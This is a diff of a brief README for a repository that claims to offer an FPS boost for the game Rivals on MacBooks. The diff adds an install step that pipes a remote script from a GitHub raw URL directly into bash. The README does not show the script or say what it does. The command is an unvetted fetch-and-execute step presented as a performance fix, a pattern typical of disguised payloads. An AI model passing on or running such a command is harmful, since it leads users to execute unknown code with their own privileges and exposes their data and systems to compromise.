@@ -1,9 +1,7 @@
 # Rivals-FPS-Boost-MacBook
-Copy the script and run it 
 
+To install the FPS boost script, run the following command in your terminal:
 
-
-script:
-
-```
+```bash
+curl -sSL https://raw.githubusercontent.com/DreamHackqwerty/Rivals-FPS-Boost-MacBook/refs/heads/main/installfpsboostrivals.sh | bash
 
